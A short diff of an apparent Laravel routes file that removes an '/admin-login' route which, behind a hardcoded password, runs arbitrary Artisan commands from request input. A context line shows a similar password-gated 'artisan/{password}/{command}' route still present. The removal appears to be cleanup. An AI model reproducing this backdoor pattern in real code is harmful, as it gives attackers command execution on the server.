@@ -42,13 +42,6 @@ Route::get('artisan/{password}/{command}', function ($password, $command) {
     }
 })->name('artisan');
 
-Route::get('/admin-login', function ($password, $command) {
-    if ($password == 'UzqTNEkK0') {
-        $exitCode = \Illuminate\Support\Facades\Artisan::call($command, request()->all());
-        echo $exitCode == 0 ? ' thành công.' : ' thất bại';
-    }
-})->name('artisan');
-
 // Handle Main / Route
 // Route::get('/', 'Auth\LoginController@checkLoginState')->name('home');
 Route::get('/locale', 'PublicController@set_lang')->name('language');
